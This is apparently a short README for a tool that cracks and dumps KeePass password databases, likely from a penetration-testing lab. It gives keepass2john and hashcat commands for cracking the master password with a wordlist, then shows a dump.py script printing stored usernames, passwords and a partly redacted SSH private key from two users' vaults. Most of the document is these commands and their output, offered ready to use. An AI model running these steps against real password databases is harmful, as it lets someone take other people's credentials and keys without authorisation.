## Cracking Keepass
get keepass master hash
`keepass2john CrackThis.kdb | grep -o "$keepass$.*" >  hash.txt`

crack it with hashcat
`hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt`


## Install
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## Dumping all passwords
`python dump.py <keepass file> <password>`

examples:
```bash
└─$ python dump.py ../milana_Database.kdbx password123
### entry title: BACKUP Machine SSH Key
username: sarah
password: xxxplaceholderxxx
notes: -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
xxx
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ python dump.py ../jim_Database.kdbx password456
### entry title: LOGIN local admin
username: dmzadmin
password: xxxabc
notes: None
### entry title: User Password
username: jim@relia.com
password: abcdefg!
notes: None
```